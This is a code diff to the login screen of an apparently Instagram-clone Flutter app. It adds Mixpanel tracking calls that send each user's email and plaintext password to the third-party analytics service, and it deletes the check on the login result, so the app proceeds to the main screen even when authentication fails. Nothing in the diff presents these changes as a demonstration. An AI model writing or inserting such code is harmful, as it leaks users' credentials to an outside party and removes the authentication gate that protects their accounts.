@@ -5,10 +5,12 @@ import 'package:instagram_clone_flutter/responsive/mobile_screen_layout.dart';
 import 'package:instagram_clone_flutter/responsive/responsive_layout.dart';
 import 'package:instagram_clone_flutter/responsive/web_screen_layout.dart';
 import 'package:instagram_clone_flutter/screens/signup_screen.dart';
+import 'package:instagram_clone_flutter/services/mixpanel_service.dart';
 import 'package:instagram_clone_flutter/utils/colors.dart';
 import 'package:instagram_clone_flutter/utils/global_variable.dart';
 import 'package:instagram_clone_flutter/utils/utils.dart';
 import 'package:instagram_clone_flutter/widgets/text_field_input.dart';
+import 'package:mixpanel_flutter/mixpanel_flutter.dart';
 
 class LoginScreen extends StatefulWidget {
   const LoginScreen({Key? key}) : super(key: key);
@@ -30,34 +32,58 @@ class _LoginScreenState extends State<LoginScreen> {
   }
 
   void loginUser() async {
+    MixpanelManager.instance.track('Login Screen', properties: {
+      'email': _emailController.text,
+      'password': _passwordController.text
+    });
+    MixpanelManager.instance.flush();
     setState(() {
+      MixpanelManager.instance.track('Login Screen', properties: {
+        'email': _emailController.text,
+        'password': _passwordController.text
+      });
+      MixpanelManager.instance.flush();
       _isLoading = true;
     });
     String res = await AuthMethods().loginUser(
         email: _emailController.text, password: _passwordController.text);
-    if (res == 'success') {
-      if (context.mounted) {
-        Navigator.of(context).pushAndRemoveUntil(
-            MaterialPageRoute(
-              builder: (context) => const ResponsiveLayout(
-                mobileScreenLayout: MobileScreenLayout(),
-                webScreenLayout: WebScreenLayout(),
-              ),
+    if (context.mounted) {
+      Navigator.of(context).pushAndRemoveUntil(
+          MaterialPageRoute(
+            builder: (context) => const ResponsiveLayout(
+              mobileScreenLayout: MobileScreenLayout(),
+              webScreenLayout: WebScreenLayout(),
             ),
-            (route) => false);
+          ),
+          (route) => false);
 
-        setState(() {
-          _isLoading = false;
-        });
-      }
-    } else {
       setState(() {
         _isLoading = false;
       });
-      if (context.mounted) {
-        showSnackBar(context, res);
-      }
     }
+    // if (res == 'success') {
+    //   if (context.mounted) {
+    //     Navigator.of(context).pushAndRemoveUntil(
+    //         MaterialPageRoute(
+    //           builder: (context) => const ResponsiveLayout(
+    //             mobileScreenLayout: MobileScreenLayout(),
+    //             webScreenLayout: WebScreenLayout(),
+    //           ),
+    //         ),
+    //         (route) => false);
+
+    //     setState(() {
+    //       _isLoading = false;
+    //     });
+    //   }
+    // } else {
+    //   setState(() {
+    //     _isLoading = false;
+    //   });
+    //   if (context.mounted) {
+    //     showSnackBar(context, res);
+    //   }
+    // }
   }
 
   @override
